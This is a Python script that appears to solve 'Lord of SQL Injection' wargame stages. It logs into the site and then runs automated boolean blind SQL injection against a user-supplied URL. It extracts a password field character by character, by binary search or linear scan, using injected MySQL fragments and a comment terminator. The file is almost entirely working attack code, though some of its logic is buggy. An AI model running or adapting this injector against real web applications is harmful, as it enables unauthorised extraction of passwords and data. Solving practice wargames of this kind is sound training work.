import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse
import sys
from getpass import getpass


def login(id, pw):
    url = 'https://los.rubiya.kr/?login'
    data = {'id': id, 'pw': pw}
    res = requests.post(url, data=data)

    if res.status_code != 200:
        print('Please check server status.')
        exit(1)
    if res.text.find('fail') != -1:
        print('Please check your id or pw')
        exit(1)

    print('Login Success!')
    return res.cookies.get_dict()


def get_length(pwning_url, field, add_comment, login_cookies):

    size_of_char = 1
    length = 1

    print('Trying to get size of each CHAR by LENGTH, LEFT')
    while True:
        url = pwning_url + ' LENGTH(LEFT({0},1)) > {1} {2} '.format(field, size_of_char, '%23' if add_comment else '')
        res = requests.get(url, cookies=login_cookies)
        soup = BeautifulSoup(res.text, 'html.parser')
        h2s = soup.find_all('h2')

        if not h2s:
            break

        size_of_char += 1
    print('Size of each CHAR is {0}'.format(size_of_char))

    while True:
        print('Trying to get length of {0} by length {1}'.format(field, length))
        url = pwning_url + ' LENGTH({0}) > {1} {2} '.format(field, length, '%23' if add_comment else '')

        # remove white space
        url = url.replace(' ', '')
        res = requests.get(url, cookies=login_cookies)

        soup = BeautifulSoup(res.text, 'html.parser')
        h2s = soup.find_all('h2')

        if not h2s:
            return int(length / size_of_char), size_of_char

        length += 1


def do_blind_inject_divide(pwning_url, field, add_comment, login_cookies):

    pw = str()
    length, size_of_char = get_length(pwning_url, field, add_comment,login_cookies)
    idx = 1
    print('Success to get length {0} is {1} '.format(field, length))
    while idx <= length:
        print('Trying to get value index[{0}]'.format(idx))
        min_ascii = 0
        max_ascii = (2 ** (size_of_char * 8)) - 1  # To get maximum value of byte

        while True:
            # password must compare with int in mysql 'a' = 'A' is true
            url = pwning_url + ' CONV(HEX(RIGHT(LEFT({0},{1}),1)), 16 , 10) > {2} {3} '.format(field, idx, int((min_ascii + max_ascii) / 2), '%23' if add_comment else '')
            print( 'CONV(RIGHT(LEFT({0},{1}),1), 16 , 10) > {2} {3} '.format(field, idx, int((min_ascii + max_ascii) / 2), '%23' if add_comment else ''))
            # remove white space
            # url = url.replace(' ', '')

            res = requests.get(url, cookies=login_cookies)
            soup = BeautifulSoup(res.text, 'html.parser')
            h2s = soup.find_all('h2')
            print(h2s)
            if max_ascii == int((min_ascii + max_ascii) / 2) or min_ascii == int((min_ascii + max_ascii) / 2) :
                if not h2s:
                    pw += chr(int((min_ascii + max_ascii) / 2))
                if h2s:
                    pw += chr(int((min_ascii + max_ascii) / 2 + 1))
                break

            # if false
            if not h2s:
                max_ascii = int((min_ascii + max_ascii) / 2)
            else:
                min_ascii = int((min_ascii + max_ascii) / 2)
        idx += 1

    parsed_url = urlparse(pwning_url)
    origin_url = '{url.scheme}://{url.netloc}/{url.path}'.format(url=parsed_url)
    print('password is {0}'.format(pw))
    res = requests.get(origin_url, params={field: pw}, cookies=login_cookies)
    soup = BeautifulSoup(res.text, 'html.parser')
    h2s = soup.find_all('h2')
    if not h2s:
        print('Failed to clear! Plz check logic')
    else:
        for h2 in h2s:
            if h2.find('Clear') != -1:
                print('Success to clear this stage!')
                break




# don't care about this method

def do_blind_inject_linear(pwning_url, field, add_comment, login_cookies):

    pw = str()
    length = get_length(pwning_url, field, add_comment,login_cookies)
    idx = 1
    print('Success to get length {0} is {1} '.format(field, length))
    while idx <= length:
        print('Trying to get value index[{0}]'.format(idx))
        for i in range(32,127):
            url = pwning_url + ' CHAR({2}) LIKE BINARY(RIGHT(LEFT({0},{1}),1)) {3} '.format(field, idx, i, '%23' if add_comment else '')
            print(url)
            res = requests.get(url, cookies=login_cookies)
            soup = BeautifulSoup(res.text, 'html.parser')
            h2s = soup.find_all('h2')
            if h2s:
                pw += chr(i)
                break
        idx += 1

    parsed_url = urlparse(pwning_url)
    origin_url = '{url.scheme}://{url.netloc}/{url.path}'.format(url=parsed_url)
    print('password is {0}'.format(pw))
    res = requests.get(origin_url, params={field: pw}, cookies=login_cookies)
    soup = BeautifulSoup(res.text, 'html.parser')
    h2s = soup.find_all('h2')
    if not h2s:
        print('Failed to clear! Plz check logic')
    else:
        for h2 in h2s:
            if h2.find('Clear') != -1:
                print('Success to clear this stage!')
                break


if __name__ == '__main__':

    user_id = input('Enter your los id : ')
    # user_pw = getpass('Enter your los pw : ')
    user_pw = input('Enter your los pw : ')
    login_cookies = login(user_id, user_pw)

    pwning_url = input('Enter your pwning_url : ')

    # delete comment for query
    if pwning_url.find('%23') != -1:
        pwning_url = pwning_url[:pwning_url.find('%23')]

    field = input('Enter query name : ')
    while True:
        add_comment = input('Do you want to add comment end of the url[Y/N] ? ')
        if add_comment.lower() == 'y' or add_comment.lower() == 'n':
            break

    method = int(input('''Chosse 1 method
    1 : divide and conquer
    2 : linear 
    default : divide first and do linear
    Ans : '''))

    if method == 1:
        do_blind_inject_divide(pwning_url, field, True if add_comment.lower() == 'y' else False, login_cookies)
    elif method == 2:
        do_blind_inject_linear(pwning_url, field, True if add_comment.lower() == 'y' else False, login_cookies)
    else:
        do_blind_inject_divide(pwning_url, field, True if add_comment.lower() == 'y' else False, login_cookies)
        do_blind_inject_linear(pwning_url, field, True if add_comment.lower() == 'y' else False, login_cookies)

